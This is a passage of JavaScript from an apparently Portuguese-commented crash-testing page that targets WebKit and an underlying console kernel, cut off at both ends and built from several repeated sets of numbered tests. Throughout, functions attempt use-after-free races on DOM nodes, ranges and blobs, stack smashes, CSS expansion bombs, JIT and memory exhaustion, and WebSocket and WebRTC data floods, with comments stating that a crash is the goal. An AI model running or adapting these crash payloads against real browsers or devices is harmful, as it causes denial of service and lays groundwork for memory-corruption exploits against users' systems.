                log("Erro CSS: " + e.message);
            }
        }

        // --- TESTE 2: Array.toLocaleString Recursion ---
        function runLocaleRecursion() {
            log("[WebKit] Iniciando Locale Recursion...");
            
            const arr = [];
            // Cria ciclo
            arr[0] = arr;
            
            // Objeto auxiliar para for√ßar processamento extra a cada n√≠vel
            const junk = {
                toLocaleString: () => {
                    // Aloca mem√≥ria na stack a cada chamada
                    const v = new Float64Array(100); 
                    return "junk";
                }
            };
            arr[1] = junk;

            try {
                log("Executando toLocaleString recursivo...");
                // O motor tenta detetar ciclos, mas implementa√ß√µes de locale podem falhar
                arr.toLocaleString();
                log("Recurs√£o tratada (Seguro).");
            } catch(e) {
                log("Erro (Stack Guard): " + e.message);
            }
        }

        // --- TESTE 3: Node.contains UAF ---
        function runNodeContainsUAF() {
            log("[WebKit] Iniciando Node.contains UAF...");
            const root = document.createElement('div');
            const child = document.createElement('div');
            root.appendChild(child);
            document.body.appendChild(root);
            
            // Objeto que se comporta como um n√≥, mas executa c√≥digo
            const evilNode = {
                // Falsifica ser um n√≥ para passar verifica√ß√µes iniciais? 
                // N√£o √© poss√≠vel passar objeto JS puro para .contains, 
                // mas podemos usar um n√≥ real e modificar a √°rvore durante getters.
            };
            
            // Estrat√©gia real:
            // .contains percorre a √°rvore para cima.
            // Se removermos 'root' do documento enquanto verificamos 'child'?
            
            log("Testando estado inst√°vel...");
            // Este √© um teste conceitual de race.
            // Removemos root e verificamos child imediatamente
            document.body.removeChild(root);
            
            // Tenta verificar contain num n√≥ "detached" com estado sujo
            const res = document.body.contains(child);
            
            log("Contains resultado: " + res);
        }

        // --- TESTE 4: JIT Memory Map Exhaustion (Kernel) ---
        function runJITFlood() {
            log("[KERNEL] Iniciando JIT Map Flood...");
            const funcs = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Cria 500 fun√ß√µes por ciclo
                    // Cada 'new Function' for√ßa o JIT a alocar mem√≥ria execut√°vel
                    for(let i=0; i<500; i++) {
                        // Corpo √∫nico para evitar cache de c√≥digo
                        const f = new Function("return " + Math.random());
                        funcs.push(f); // Mant√©m vivo
                        count++;
                    }
                    
                    if (count % 5000 === 0) log(`Fun√ß√µes JIT: ${count}`);
                    
                    if (count > 200000) {
                        clearInterval(interval);
                        log("JIT Flood finalizado. Verifique estabilidade.");
                    }
                } catch(e) {
                    clearInterval(interval);
                    log("Erro JIT (OOM Real): " + e.message);
                }
            }, 10);
        }

        // --- TESTE 5: VFS Pathname Stack Smash (Kernel) ---
        function runPathOverflow() {
            log("[KERNEL] Iniciando VFS Path Smash...");
            
            // Cria um caminho maior que PATH_MAX (geralmente 1024 ou 4096)
            // Tenta 8KB para garantir
            const hugePath = "/" + "A".repeat(8192);
            
            try {
                log("Acedendo caminho de 8KB...");
                // fetch com file:// ou caminho relativo bizarro
                // O Kernel tenta normalizar o caminho na stack
                const xhr = new XMLHttpRequest();
                xhr.open("GET", hugePath);
                xhr.send();
                
                log("Syscall retornou (Seguro).");
            } catch(e) {
                // Erro de rede √© normal. Crash √© o objetivo.
                log("Erro Path: " + e.message);
            }
        }

        // --- TESTE 6: WebRTC UDP Buffer Flood (Kernel) ---
        function runUDPFlood() {
            log("[KERNEL] Iniciando UDP Flood...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("flood", { ordered: false, maxRetransmits: 0 }); // UDP puro
            
            // Payload de 16KB
            const data = new Uint8Array(16 * 1024).fill(0x41);
            
            dc.onopen = () => {
                log("Canal aberto. Disparando...");
                const interval = setInterval(() => {
                    // Envia at√© encher o buffer
                    if (dc.bufferedAmount < 10 * 1024 * 1024) {
                        for(let i=0; i<50; i++) dc.send(data);
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    pc.close();
                    log("UDP Flood finalizado.");
                }, 5000);
            };
            
            // Setup dummy (loopback)
            pc.createOffer().then(o => pc.setLocalDescription(o));
        }
 function runTemplateUAF() {
            log("[WebKit] Iniciando Template UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            const template = document.createElement('template');
            template.innerHTML = "<div id='target'>DATA</div>";
            const content = template.content;
            const target = content.getElementById('target');
            
            // Prepara um getter que roda durante a ado√ß√£o? 
            // Dif√≠cil em n√≥s puros, usamos MutationObserver no sandbox
            
            try {
                log("Adotando conte√∫do do template...");
                // Move o conte√∫do para o documento principal
                // O GOLPE: Tenta limpar o template original logo ap√≥s iniciar a ado√ß√£o
                // Se o motor n√£o proteger a refer√™ncia 'content', crash.
                const adopted = document.adoptNode(content);
                
                // Destroi a refer√™ncia original
                template.innerHTML = ""; 
                
                sandbox.appendChild(adopted);
                log("Template Adopted (Seguro).");
                
            } catch(e) {
                log("Erro Template: " + e.message);
            }
        }

        // --- TESTE 2: WeakSet GC Stack Smash ---
        function runWeakSetCrash() {
            log("[WebKit] Criando WeakSet Chain...");
            
            const sets = [];
            const root = {};
            let current = root;
            
            // Cria uma cadeia profunda de objetos mantidos por WeakSets
            // O GC precisa percorrer isso recursivamente para marcar
            for(let i=0; i<20000; i++) {
                const next = {};
                const ws = new WeakSet();
                ws.add(next);
                // A √∫nica refer√™ncia forte para 'ws' est√° no array
                // A √∫nica refer√™ncia para 'next' √© fraca (se n√£o guardarmos em 'sets')
                // Na verdade, precisamos de refer√™ncia FORTE para o ws e FRACA para o objeto
                // para estressar o mecanismo de Ephemeron.
                current.next = next;
                sets.push(ws);
                current = next;
            }
            
            log("Cadeia criada. For√ßando aloca√ß√£o para disparar GC...");
            
            // Tenta disparar o GC
            const trash = [];
            const interval = setInterval(() => {
                trash.push(new ArrayBuffer(1024 * 1024));
                if (trash.length > 500) {
                    clearInterval(interval);
                    log("Teste GC finalizado (Sem crash).");
                }
            }, 10);
        }

        // --- TESTE 3: CSS Variable Shadow Cycle ---
        function runCSSCycle() {
            log("[WebKit] Iniciando CSS Shadow Cycle...");
            const host = document.createElement('div');
            document.body.appendChild(host);
            const shadow = host.attachShadow({mode: 'open'});
            
            // Define vari√°vel no host que depende de vari√°vel no shadow (imposs√≠vel, mas tentamos ciclo)
            host.style.setProperty('--a', 'var(--b)');
            
            const child = document.createElement('div');
            // Define vari√°vel no shadow que depende de vari√°vel herdada
            child.style.setProperty('--b', 'var(--a)');
            shadow.appendChild(child);
            
            log("Ciclo injetado. For√ßando layout...");
            const h = child.offsetHeight;
            
            log("Layout seguro.");
            document.body.removeChild(host);
        }

        // --- TESTE 4: console.group Stack Smash (Kernel) ---
        function runGroupSmash() {
            log("[KERNEL] Iniciando Console Group Smash...");
            
            let count = 0;
            const limit = 10000; // Profundidade agressiva
            
            function dive() {
                count++;
                if (count > limit) {
                    // Desbobina
                    while(count > 0) { console.groupEnd(); count--; }
                    log("Group Smash sobreviveu.");
                    return;
                }
                
                // Cada group() aumenta o n√≠vel de indenta√ß√£o no driver de log
                console.group("L" + count);
                
                // Usa setTimeout para n√£o bloquear a thread JS, 
                // mas encher o buffer do kernel
                if (count % 100 === 0) setTimeout(dive, 0);
                else dive();
            }
            
            dive();
        }

        // --- TESTE 5: Blob Revoke/Read Race (Kernel) ---
        function runBlobRace() {
            log("[KERNEL] Iniciando Blob Race...");
            
            const blob = new Blob(["DATA".repeat(1000)]);
            const url = URL.createObjectURL(blob);
            
            // 1. Inicia leitura
            fetch(url).then(() => {}).catch(() => {});
            
            // 2. O GOLPE: Revoga imediatamente
            // Tenta invalidar o handle enquanto o Kernel abre o ficheiro virtual
            URL.revokeObjectURL(url);
            
            // Repete em loop para aumentar chance
            let i = 0;
            const interval = setInterval(() => {
                i++;
                const b = new Blob(["RACE"]);
                const u = URL.createObjectURL(b);
                fetch(u).catch(()=>{});
                URL.revokeObjectURL(u);
                
                if (i > 1000) {
                    clearInterval(interval);
                    log("Blob Race finalizada.");
                }
            }, 5);
        }

        // --- TESTE 6: IPC Port Ring Deadlock (Kernel) ---
        function runIPCRing() {
            log("[KERNEL] Criando IPC Ring Deadlock...");
            
            const ch1 = new MessageChannel();
            const ch2 = new MessageChannel();
            const ch3 = new MessageChannel();
            
            // Cria ciclo: 1 -> 2 -> 3 -> 1
            // Envia a porta de sa√≠da do pr√≥ximo canal para o atual
            ch1.port1.postMessage("cycle", [ch2.port2]);
            ch2.port1.postMessage("cycle", [ch3.port2]);
            ch3.port1.postMessage("cycle", [ch1.port2]);
            
            log("Anel criado. Enchendo buffers...");
            
            // Enche os buffers de todos
            const data = new Uint8Array(1024).fill(0x41);
            for(let i=0; i<100; i++) {
                try {
                    ch1.port1.postMessage(data);
                    ch2.port1.postMessage(data);
                    ch3.port1.postMessage(data);
                } catch(e) {}
            }
            
            log("Fechando tudo simultaneamente...");
            // O Kernel tem de resolver quem fecha primeiro num ciclo de depend√™ncia
            ch1.port1.close();
            ch2.port1.close();
            ch3.port1.close();
            
            log("Teste Ring finalizado.");
        }
function runSurroundCrash() {
            log("[WebKit] Iniciando SurroundContents UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div id='target'><b>TEXTO</b></div>";
            const target = sandbox.firstChild;
            
            const range = document.createRange();
            range.selectNodeContents(target);
            
            const wrapper = document.createElement('div');
            
            // O GOLPE: O wrapper tem um getter que remove o target do DOM
            // quando a propriedade 'appendChild' (ou similar) √© acessada internamente
            // Como √© dif√≠cil interceptar m√©todos nativos, usamos MutationObserver
            
            const obs = new MutationObserver(() => {
                log("Muta√ß√£o! Destruindo contexto...");
                sandbox.innerHTML = ""; // Remove tudo
                // Aloca lixo
                const junk = new Array(5000).fill(1.1);
            });
            obs.observe(sandbox, {childList: true, subtree: true});

            try {
                log("Executando surroundContents...");
                // O WebKit move o conte√∫do para o wrapper.
                // O Observer dispara na remo√ß√£o do conte√∫do original.
                // Se o WebKit tentar inserir o wrapper no 'target' (que foi removido pelo observer), Crash.
                range.surroundContents(wrapper);
                log("Range sobreviveu.");
            } catch(e) {
                log("Erro Range: " + e.message);
            }
            obs.disconnect();
        }

        // --- TESTE 2: CSS Transition Property Explosion ---
        function runTransitionFlood() {
            log("[WebKit] Iniciando Transition Explosion...");
            const el = document.createElement('div');
            document.body.appendChild(el);
            
            // Define transi√ß√£o para TUDO
            el.style.transition = "all 1s linear";
            
            // For√ßa layout inicial
            getComputedStyle(el).opacity;
            
            try {
                log("Aplicando 10.000 propriedades em transi√ß√£o...");
                // Altera 10.000 propriedades customizadas simultaneamente
                // O motor de anima√ß√£o tem de criar um interpolador para cada uma
                for(let i=0; i<10000; i++) {
                    el.style.setProperty(`--v${i}`, "100px");
                }
                
                // For√ßa o c√°lculo do pr√≥ximo frame
                const val = getComputedStyle(el).getPropertyValue("--v5000");
                log("Style Engine sobreviveu.");
                
            } catch(e) {
                log("Erro CSS: " + e.message);
            }
            document.body.removeChild(el);
        }

        // --- TESTE 3: Stream PipeTo Closure Race ---
        function runPipeRace() {
            log("[WebKit] Iniciando Stream Pipe Race...");
            
            try {
                // Fonte infinita
                const rs = new ReadableStream({
                    pull(c) { c.enqueue("chunk"); }
                });
                
                // Destino que aceita escrita
                const ws = new WritableStream({
                    write(chunk) { return new Promise(r => setTimeout(r, 1)); }
                });
                
                log("Iniciando Pipe...");
                const pipe = rs.pipeTo(ws);
                
                // O GOLPE: Cancelar e Abortar de lados opostos simultaneamente
                setTimeout(() => {
                    log("Race Triggered!");
                    rs.cancel("Source Cancel");
                    ws.abort("Dest Abort");
                }, 10);
                
                pipe.catch(e => log("Pipe fechado: " + e));
                
            } catch(e) { log("Erro Stream: " + e.message); }
        }

        // --- TESTE 4: Kernel Event Queue Exhaustion (Kernel) ---
        function runEventQExhaustion() {
            log("[KERNEL] Iniciando Event Queue Flood...");
            
            const channels = [];
            const count = 50000;
            
            try {
                // Cria canais e envia mensagem n√£o lida
                for(let i=0; i<count; i++) {
                    const mc = new MessageChannel();
                    mc.port1.postMessage("event");
                    channels.push(mc); // Mant√©m vivo
                    
                    if (i % 5000 === 0) log(`Eventos pendentes: ${i}`);
                }
                
                log("Canais criados. Destruindo em massa...");
                // Limpa refer√™ncias para for√ßar GC e limpeza do Kernel
                // O Kernel tem de processar a destrui√ß√£o de 50k pipes com dados pendentes
                channels.length = 0; 
                
                // Aloca mem√≥ria para for√ßar GC
                const junk = new ArrayBuffer(1024*1024*50);
                
            } catch(e) {
                log("Limite atingido: " + e.message);
            }
        }

        // --- TESTE 5: SharedBuffer Map/Unmap Thrash (Kernel) ---
        function runSABThrash() {
            log("[KERNEL] Iniciando VM Map Thrash...");
            
            if (!window.SharedArrayBuffer) return log("SAB Off.");
            
            const workerUrl = URL.createObjectURL(new Blob([""], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                i++;
                // Cria SAB (Mapeia mem√≥ria)
                const sab = new SharedArrayBuffer(4096);
                const w = new Worker(workerUrl);
                
                // Envia para worker (Mapeia no espa√ßo do worker)
                w.postMessage(sab);
                
                // Mata worker (Desmapeia)
                w.terminate();
                
                // Liberta refer√™ncia principal (Eventual desmapeio)
                
                if (i % 1000 === 0) log(`Ciclos Map/Unmap: ${i}`);
                if (i > 10000) clearInterval(interval);
                
            }, 1); // O mais r√°pido poss√≠vel
        }

        // --- TESTE 6: Socket Mbuf Fragmentation (Kernel) ---
        function runMbufChurn() {
            log("[KERNEL] Iniciando Mbuf Fragmentation...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            
            // Payloads de tamanhos variados para fragmentar o heap de rede
            const tiny = new Uint8Array(1);
            const huge = new Uint8Array(16000); // Pr√≥ximo de 16KB
            
            ws.onopen = () => {
                log("Socket aberto. Fragmentando...");
                const interval = setInterval(() => {
                    if (ws.bufferedAmount < 5 * 1024 * 1024) {
                        // Padr√£o Zebra: Pequeno, Grande, Pequeno, Grande
                        ws.send(tiny);
                        ws.send(huge);
                        ws.send(tiny);
                        ws.send(huge);
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    ws.close();
                    log("Churn finalizado.");
                }, 5000);
            };
        }
function runNormalizeUAF() {
            log("[WebKit] Iniciando Normalize UAF...");
            const box = document.getElementById('sandbox');
            box.innerHTML = "";
            
            // Cria n√≥s de texto adjacentes
            const t1 = document.createTextNode("A");
            const t2 = document.createTextNode("B");
            const t3 = document.createTextNode("C");
            box.appendChild(t1);
            box.appendChild(t2);
            box.appendChild(t3);
            
            // Cria um range que seleciona o segundo n√≥ (que ser√° fundido)
            const range = document.createRange();
            range.setStart(t2, 0);
            range.setEnd(t2, 1);
            
            log("Range focado em 'B'. Normalizando...");
            
            try {
                // O GOLPE: normalize() funde t1, t2, t3 num s√≥. t2 √© removido.
                // O Range deve atualizar seus ponteiros. Se falhar, aponta para mem√≥ria morta.
                box.normalize();
                
                // Tenta usar o range imediatamente
                const content = range.extractContents();
                log("Range extra√≠do (Seguro).");
                
            } catch(e) {
                log("Erro Range: " + e.message);
            }
        }

        // --- TESTE 2: CSS calc(Inf) Layout Storm ---
        function runCalcCrash() {
            log("[WebKit] Iniciando Layout Storm...");
            const box = document.getElementById('sandbox');
            box.innerHTML = "";
            
            // Cria estrutura profunda
            let html = "";
            for(let i=0; i<2000; i++) html += "<div>";
            for(let i=0; i<2000; i++) html += "</div>";
            box.innerHTML = html;
            
            const style = document.createElement('style');
            // Injeta valores infinitos em propriedades de layout
            style.textContent = `
                div {
                    width: calc(100% / 0);
                    height: calc(1px * infinity);
                    padding: calc(1px / 0);
                    margin: calc(NaN * 1px);
                    display: flex; 
                }
            `;
            
            log("Aplicando CSS Infinito...");
            document.head.appendChild(style);
            
            // For√ßa layout
            setTimeout(() => {
                try {
                    const h = box.offsetHeight;
                    log("Layout Engine sobreviveu.");
                } catch(e) { log("Erro: " + e); }
                document.head.removeChild(style);
                box.innerHTML = "";
            }, 100);
        }

        // --- TESTE 3: RegExp Sticky JIT Freeze ---
        function runStickyLoop() {
            log("[WebKit] Iniciando Sticky JIT Loop...");
            
            const re = /(?:)/y; // Match vazio sticky
            re.lastIndex = 0;
            
            // Aviso: Isso vai travar a thread.
            // O objetivo √© ver se o Watchdog mata o processo ou se o sistema todo congela.
            
            setTimeout(() => {
                const start = Date.now();
                while (Date.now() - start < 5000) { // Tenta travar por 5s
                    re.exec("texto");
                    // N√£o avan√ßamos lastIndex. Loop infinito l√≥gico.
                    // O JIT tenta otimizar isso.
                }
                log("Loop finalizado (Watchdog funcionou).");
            }, 10);
        }

        // --- TESTE 4: Socket Receive Buffer Exhaustion (Kernel) ---
        function runRecvFlood() {
            log("[KERNEL] Iniciando Recv Buffer Flood...");
            
            const controllers = [];
            let count = 0;
            
            // Inicia 50 downloads de ficheiros grandes (ex: blobs gerados ou arquivos dummy)
            // Usa cache busting para garantir requests reais
            const interval = setInterval(() => {
                if (count >= 50) {
                    clearInterval(interval);
                    log("50 Streams abertos e parados. Kernel bufferizando...");
                    return;
                }
                
                const controller = new AbortController();
                controllers.push(controller);
                
                // Request que nunca √© lido
                fetch(window.location.href + "?flood=" + Math.random(), {
                    signal: controller.signal
                }).then(res => {
                    // N√ÉO chame res.text() ou res.blob()
                    // Deixe o body stream pendente.
                    // O Kernel tem de guardar os dados que chegam.
                    log(`Stream ${count} aberto (Pending)...`);
                });
                
                count++;
            }, 100);
        }

        // --- TESTE 5: History URL IPC Overflow (Kernel) ---
        function runURLOverflow() {
            log("[KERNEL] Iniciando URL Path Overflow...");
            
            // Cria path gigante (1MB)
            const path = "/" + "A".repeat(1024 * 1024);
            
            try {
                // O pushState envia a URL para o processo VSH (UI)
                // Se o buffer IPC for fixo, estoura.
                history.pushState({}, "Crash", path);
                log("URL enviada (Seguro).");
            } catch(e) {
                // SecurityError √© normal se a URL for muito longa.
                // Crash √© o objetivo.
                log("Erro IPC: " + e.message);
            }
        }

        // --- TESTE 6: Console Error I/O Lock (Kernel) ---
        function runErrorFlood() {
            log("[KERNEL] Iniciando Stderr Lock Flood...");
            
            const workerCode = `
                setInterval(() => {
                    // Objeto complexo for√ßa serializa√ß√£o no Kernel
                    const obj = { a: 1, b: "test", c: [1,2,3] };
                    console.error("CRITICAL_KERNEL_TEST", obj);
                }, 0);
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 30 Workers focados em stderr
            for(let i=0; i<30; i++) {
                new Worker(url);
            }
            log("30 Workers em console.error. Verifique estabilidade.");
        }
 function runInsertUAF() {
            log("[WebKit] Iniciando InsertBefore UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div id='parent'><div id='ref'>REF</div></div>";
            const parent = document.getElementById('parent');
            const ref = document.getElementById('ref');
            
            try {
                // Cria um fragmento com um script malicioso
                const frag = document.createDocumentFragment();
                const script = document.createElement('script');
                script.textContent = `
                    parent.log("Script executando durante inser√ß√£o...");
                    // O GOLPE: Remove o 'parent' do DOM enquanto o C++ insere
                    const p = document.getElementById('parent');
                    if (p) p.remove();
                    
                    // Aloca lixo para sobrescrever a mem√≥ria
                    const junk = new Array(5000).fill(1.1);
                `;
                frag.appendChild(script);
                frag.appendChild(document.createElement('div')); // N√≥ extra

                log("Executando insertBefore...");
                // O C++ insere o script -> script roda e remove parent -> C++ tenta inserir o div extra no parent morto
                parent.insertBefore(frag, ref);
                
                log("DOM sobreviveu.");
            } catch(e) {
                log("Erro DOM: " + e.message);
            }
            sandbox.innerHTML = "";
        }

        // --- TESTE 2: CSS @import Recursion ---
        function runCSSImport() {
            log("[WebKit] Criando Cadeia @import...");
            
            try {
                const head = document.head;
                let currentUrl = "";
                const depth = 2000;
                
                // Cria cadeia de Blobs CSS: A importa B, B importa C...
                // De tr√°s para frente
                let nextBlobUrl = "";
                
                for(let i=0; i<depth; i++) {
                    const cssContent = i === 0 ? ".end { color: red; }" : `@import url('${nextBlobUrl}');`;
                    const blob = new Blob([cssContent], {type: 'text/css'});
                    nextBlobUrl = URL.createObjectURL(blob);
                }
                
                log("Injetando CSS Raiz...");
                const link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = nextBlobUrl;
                head.appendChild(link);
                
                // For√ßa carregamento
                getComputedStyle(document.body).color;
                
                setTimeout(() => {
                    log("CSS Loader sobreviveu (Verifique se o estilo aplicou).");
                    head.removeChild(link);
                }, 2000);
                
            } catch(e) {
                log("Erro CSS: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Interpreter Bytecode Overflow ---
        function runRegexBytecode() {
            log("[WebKit] Gerando RegExp Gigante...");
            
            try {
                // Cria padr√£o com muitos grupos alternativos
                // (a|b|c|d|e....)
                let pattern = "(";
                for(let i=0; i<20000; i++) {
                    pattern += "a" + i + "|";
                }
                pattern += "end)";
                
                log(`Compilando Regex de ${pattern.length} bytes...`);
                
                // O interpretador precisa gerar bytecode para cada alternativa
                // Se o buffer de bytecode for fixo ou overflow, crash.
                const re = new RegExp(pattern);
                
                log("Executando match...");
                re.test("a500");
                
                log("RegExp Interpreter sobreviveu.");
                
            } catch(e) {
                log("Erro RegExp: " + e.message);
            }
        }

        // --- TESTE 4: Pthread Join Deadlock Race (Kernel) ---
        function runThreadDeadlock() {
            log("[KERNEL] Iniciando Thread Deadlock...");
            
            const workerCode = `
                onmessage = e => {
                    // Loop ocupado
                    const start = Date.now();
                    while(Date.now() - start < 1000);
                    postMessage("done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lan√ßa muitos workers
            const workers = [];
            for(let i=0; i<20; i++) workers.push(new Worker(url));
            
            log("Workers lan√ßados. Terminando em ordem aleat√≥ria...");
            
            // O GOLPE: Terminar workers fora de ordem
            // O Kernel precisa fazer 'join' nas threads. Se houver depend√™ncia, trava.
            const interval = setInterval(() => {
                if (workers.length === 0) {
                    clearInterval(interval);
                    log("Teste finalizado.");
                    return;
                }
                
                // Pega um worker aleat√≥rio
                const idx = Math.floor(Math.random() * workers.length);
                const w = workers.splice(idx, 1)[0];
                w.terminate();
                
            }, 10);
        }

        // --- TESTE 5: Socket Send Buffer Off-by-One (Kernel) ---
        function runSocketOverflow() {
            log("[KERNEL] Testando Socket Buffer Edge Case...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            
            // Tenta tamanhos pr√≥ximos de pot√™ncias de 2 (limites de aloca√ß√£o comuns)
            // 65536, 65537, etc.
            const sizes = [65535, 65536, 65537];
            
            ws.onopen = () => {
                log("Conectado. Enviando payloads de borda...");
                
                sizes.forEach(size => {
                    try {
                        const data = new Uint8Array(size).fill(0x41);
                        ws.send(data);
                    } catch(e) {
                        log("Erro envio: " + e.message);
                    }
                });
                
                // Envia um gigante para for√ßar fragmenta√ß√£o
                ws.send(new Uint8Array(1024*1024));
                
                setTimeout(() => {
                    ws.close();
                    log("Envio conclu√≠do.");
                }, 2000);
            };
        }

        // --- TESTE 6: Blob VFS Handle Leak (Kernel) ---
        function runBlobHandleRace() {
            log("[KERNEL] Iniciando Blob VFS Race...");
            
            const img = new Image();
            let count = 0;
            
            const interval = setInterval(() => {
                count++;
                if (count > 200) {
                    clearInterval(interval);
                    log("Teste VFS finalizado.");
                    return;
                }

                // 1. Cria Blob e URL
                const blob = new Blob(["IMG"], {type: "image/png"});
                const url = URL.createObjectURL(blob);
                
                // 2. Atribui √† imagem (O Kernel abre o ficheiro)
                img.src = url;
                
                // 3. O GOLPE: Revoga imediatamente
                // Tenta fechar o handle enquanto o driver gr√°fico tenta ler
                URL.revokeObjectURL(url);
                
            }, 5);
        }
 function runCSSExponential() {
            log("[WebKit] Iniciando CSS Expansion...");
            const style = document.createElement('style');
            const depth = 30; // 2^30 tokens = Gigabytes de texto
            
            let css = ":root { --v0: X; ";
            for (let i = 1; i <= depth; i++) {
                css += `--v${i}: var(--v${i-1}) var(--v${i-1}); `;
            }
            css += "} #target { content: var(--v" + depth + "); }";
            
            style.textContent = css;
            const target = document.createElement('div');
            target.id = 'target';
            
            log("Injetando CSS Bomba...");
            document.head.appendChild(style);
            document.body.appendChild(target);
            
            try {
                // For√ßa c√°lculo de estilo
                getComputedStyle(target).content;
                log("CSS Engine sobreviveu.");
            } catch(e) {
                log("Erro CSS: " + e.message);
            }
            
            document.head.removeChild(style);
            document.body.removeChild(target);
        }

        // --- TESTE 2: Array Species Double-Free Trap ---
        function runSpeciesTrap() {
            log("[WebKit] Iniciando Species Trap...");
            
            const a = [1, 2, 3];
            // Construtor malicioso
            a.constructor = {
                [Symbol.species]: function(len) {
                    log("Species chamado. Tamanho pedido: " + len);
                    // Retorna um array, mas tenta manipular o estado aqui
                    // Em um exploit real, tentar√≠amos neutrar 'a' aqui se fosse um TypedArray
                    return [1]; 
                }
            };
            
            try {
                // Concat usa species para criar o resultado
                const res = a.concat([4, 5]);
                log("Concat finalizado. Res: " + res.length);
            } catch(e) {
                log("Erro Concat: " + e.message);
            }
        }

        // --- TESTE 3: FontFaceSet Iterator Mutation ---
        function runFontIterCrash() {
            log("[WebKit] Iniciando Font Iteration...");
            
            // Adiciona fontes dummy
            for(let i=0; i<100; i++) {
                const f = new FontFace('Family'+i, 'url(data:font/woff;base64,AAAA)');
                document.fonts.add(f);
            }
            
            try {
                log("Iterando e deletando...");
                // Itera sobre o Set
                document.fonts.forEach((f, i) => {
                    // O GOLPE: Limpa o set inteiro no meio do loop
                    if (i === 10) {
                        document.fonts.clear();
                        // Adiciona lixo para reocupar mem√≥ria
                        const junk = new Array(1000).fill(1.1);
                        log("Fonts limpo durante itera√ß√£o.");
                    }
                });
                log("Itera√ß√£o sobreviveu.");
            } catch(e) {
                log("Erro Font: " + e.message);
            }
        }

        // --- TESTE 4: IPC Duplicate Transfer (Kernel) ---
        function runDuplicateTransfer() {
            log("[KERNEL] Tentando Duplicate Transfer...");
            
            const channel = new MessageChannel();
            const buffer = new ArrayBuffer(1024);
            
            try {
                // O GOLPE: Tenta transferir o MESMO buffer duas vezes na lista
                // Se o Kernel tentar desmapear 'buffer' duas vezes -> Panic
                channel.port1.postMessage("crash", [buffer, buffer]);
                
                log("Envio aceite (Seguro - ou falha JS).");
            } catch(e) {
                // DataCloneError significa que a prote√ß√£o funcionou
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 5: Blob Deep Recursion (Kernel) ---
        function runBlobRecursion() {
            log("[KERNEL] Criando Blob Recursivo...");
            
            let parts = ["base"];
            // Cria aninhamento profundo: Blob([Blob([Blob...])])
            for(let i=0; i<5000; i++) {
                parts = [new Blob(parts)];
            }
            
            const finalBlob = new Blob(parts);
            log("Blob criado. For√ßando leitura no Kernel...");
            
            const fr = new FileReader();
            fr.readAsText(finalBlob);
            
            fr.onerror = () => log("Erro Leitura.");
            fr.onload = () => log("Leitura OK (Stack segura).");
        }

        // --- TESTE 6: Socket Buffer Deadlock (Kernel) ---
        function runSocketDeadlock() {
            log("[KERNEL] Iniciando Socket Deadlock...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const data = new Uint8Array(1024 * 1024).fill(0x41); // 1MB
            
            ws.onopen = () => {
                log("Socket aberto. Inundando...");
                
                // Envia dados o mais r√°pido poss√≠vel
                // N√£o l√™ a resposta (onmessage vazio)
                const interval = setInterval(() => {
                    if (ws.bufferedAmount < 50 * 1024 * 1024) { // 50MB buffer
                        ws.send(data);
                    } else {
                        log("Buffer cheio. Kernel sob press√£o.");
                        // N√£o para, mant√©m a press√£o
                    }
                }, 5);
                
                setTimeout(() => {
                    clearInterval(interval);
                    ws.close();
                    log("Teste terminado.");
                }, 10000);
            };
        }
 // --- TESTE 1: TreeWalker replaceChild UAF ---
        function runTreeWalkerRace() {
            log("[WebKit] Iniciando TreeWalker Race...");
            const root = document.createElement('div');
            root.innerHTML = "<span>A</span><b>B</b><i>C</i>";
            document.body.appendChild(root);
            
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            walker.nextNode(); // root
            const target = walker.nextNode(); // span
            
            log("Walker posicionado em SPAN. Substituindo n√≥...");
            
            try {
                // O GOLPE: Substitui o n√≥ atual (SPAN) por um novo (DIV)
                const newNode = document.createElement('div');
                
                target.addEventListener('DOMNodeRemoved', () => {
                    // Tenta mover o walker enquanto o n√≥ est√° a ser removido
                    walker.previousNode();
                });

                root.replaceChild(newNode, target);
                
                const current = walker.currentNode;
                log("Walker sobreviveu. Current: " + current.nodeName);
                
            } catch(e) {
                log("Erro Walker: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 2: URLSearchParams Stack Smash ---
        function runURLParamsSmash() {
            log("[WebKit] Iniciando URLParams Smash...");
            
            try {
                // Cria query string com 500.000 chaves
                const keys = new Array(500000).fill("key=value").join("&");
                
                log(`Parseando query string de ${keys.length} bytes...`);
                
                const params = new URLSearchParams(keys);
                
                log("Parser terminou (Seguro).");
                
            } catch(e) {
                log("Erro URL: " + e.message);
            }
        }

        // --- TESTE 3: CanvasGradient Realloc Race ---
        function runGradientRace() {
            log("[WebKit] Iniciando Gradient Realloc...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                const grad = ctx.createLinearGradient(0, 0, 500, 500);
                
                grad.addColorStop(0, "red");
                grad.addColorStop(1, "blue");
                
                let i = 0;
                const interval = setInterval(() => {
                    i++;
                    grad.addColorStop(Math.random(), "green");
                    
                    ctx.fillStyle = grad;
                    ctx.fillRect(0, 0, 500, 500);
                    
                    if (i > 5000) {
                        clearInterval(interval);
                        log("Teste Gradiente finalizado.");
                    }
                }, 0);
                
            } catch(e) {
                log("Erro Gradient: " + e.message);
            }
        }

        // --- TESTE 4: Socket Close Race (Kernel) ---
        function runSocketCloseRace() {
            log("[KERNEL] Iniciando Socket Close Race...");
            
            const data = new Uint8Array(1024 * 1024).fill(0x41);
            
            const interval = setInterval(() => {
                try {
                    const ws = new WebSocket("wss://echo.websocket.org");
                    
                    ws.onopen = () => {
                        ws.send(data);
